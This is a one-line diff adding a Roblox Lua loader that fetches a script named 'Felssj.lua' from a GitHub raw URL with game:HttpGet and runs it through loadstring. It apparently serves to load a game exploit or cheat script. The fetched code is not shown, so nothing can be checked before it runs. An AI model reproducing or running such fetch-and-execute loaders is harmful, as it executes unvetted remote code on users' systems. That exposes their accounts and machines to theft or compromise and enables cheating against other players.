@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Emanuang123/FELSSJ-CRIMSON/refs/heads/main/Felssj.lua"))()
